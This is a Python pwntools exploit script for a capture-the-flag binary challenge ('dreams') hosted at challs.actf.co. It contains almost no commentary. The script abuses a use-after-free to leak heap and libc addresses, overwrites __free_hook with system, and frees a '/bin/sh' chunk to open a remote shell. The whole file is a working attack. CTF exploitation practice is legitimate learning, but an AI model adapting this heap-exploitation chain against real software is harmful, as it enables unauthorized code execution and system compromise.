#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challs.actf.co --port 31227 ./dreams
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./dreams_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challs.actf.co'
port = int(args.PORT or 31227)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

def add(idx,date,about):
    io.sendlineafter(b"> ",b"1")
    io.sendlineafter(b"? ",str(idx).encode())
    io.sendafter(b"? ",date.ljust(8,b"\x00"))
    io.sendafter(b"? ",about)

def delete(idx):
    io.sendlineafter(b"> ",b"2")
    io.sendlineafter(b"? ",str(idx).encode())

def visit(idx,date):
    io.sendlineafter(b"> ",b"3")
    io.sendlineafter(b"? ",str(idx).encode())
    io.recvuntil(b"that ")
    leak = io.recvline()[:-1]
    io.sendafter(b": ",date.ljust(8,b"\x00"))
    return leak

libc = ELF("./libc.so.6")

add(1,b"a"*7,b"a"*8)
add(2,b"b"*7,b"b"*8)
add(3,b"c"*7,b"c"*8)
delete(1)
delete(2)
base_heap = u64(visit(2,b"Z"*7).ljust(8,b"\x00"))-0x10
print(f"{hex(base_heap)}")
to_write = base_heap + 0x1330
to_write = 0x404020+8
visit(2,p64(to_write))

dreams = base_heap + 0x1310
add(4,b"z"*7,p64(0)+p64(dreams))

what_write = base_heap + 0x1310
# what_write = base_heap + 0x2a0
add(0,p64(what_write),p64(what_write))
print(f"{hex(what_write)}")

visit(2,p64(0x404010))
libc.address = u64(visit(0,p64(0x30)).ljust(8,b"\x00")) - libc.sym['_IO_2_1_stdout_']
print(f"libc.address : {hex(libc.address)}")

free_hook = libc.sym['__free_hook']
print(f"free_hook : {hex(free_hook)}")
visit(2,p64(free_hook))
visit(0,p64(libc.sym['system']))

visit(2,b"/bin/sh\x00")
delete(2)

# for i in range(7,13):
#     add(7,p64(0),p64(0x20))
# add(2,b"b"*7,b"b"*8)
# delete(3)

io.interactive()

